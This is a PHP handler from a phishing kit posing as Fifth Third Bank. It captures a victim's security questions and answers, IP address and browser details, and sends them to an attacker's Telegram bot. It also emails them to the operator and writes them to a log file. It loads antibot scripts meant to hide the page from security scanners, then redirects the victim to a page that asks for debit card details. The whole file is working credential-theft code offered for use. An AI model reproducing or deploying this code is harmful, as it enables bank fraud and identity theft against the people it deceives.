<?php

session_start();
error_reporting(0);


include('../assets/Antibot/blockers.php');
include('../assets/Antibot/detects.php');


$TIME_DATE = date('H:i:s d/m/Y');
include('../assets/functions/get_browser.php');
include('../assets/functions/get_ip.php');
include ('../config.php');



$Z118_MESSAGE .= "

[ 53RD SECURITY INFO]
[ USER SECURITY INFORMATION]

[Q1] = ".$_POST['question1']."
[A1] = ".$_POST['answer1']."

[Q2] = ".$_POST['question2']."
[A2] = ".$_POST['answer2']."

[Q3] = ".$_POST['question3']."
[A3] = ".$_POST['answer3']."

[VICTIM INFORMATION]

[TIME/DATE]    = ".$TIME_DATE."
[IP INFO] = http://ip-api.com/json/".$_SESSION['_ip_']."
[REMOTE IP]    = ".$_SERVER['REMOTE_ADDR']."
[BROWSER] = ".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."
[BROWSER] = ".$_SERVER['HTTP_USER_AGENT']."
";

if (!empty($_POST['answer2'])){
	
	$data = [
		'text' => ''.$Z118_MESSAGE.'',
		'chat_id' => ''.$chat_id.''
	];
	file_get_contents("https://api.telegram.org/bot".$bot_token."/sendMessage?" . http_build_query($data) );
	
	if ($save_result == "on") {
		$res_file = fopen("../53RD_LOGS/SECURITY_INFORMATION.txt", "a");
		fwrite($res_file, $Z118_MESSAGE);
	}
	
	
	$Z118_SUBJECT = "✪ LOGIN FROM : ✪ ".$_SESSION['userids']." ✪";
	$Z118_HEADERS .= "From:XD <X-hammer@logs.com>";
	$Z118_HEADERS .= "MIME-Version: 1.0\n";
	$Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
	
	
	@mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
	
	Header("Location: ../verify_debit_card");
}

		
?>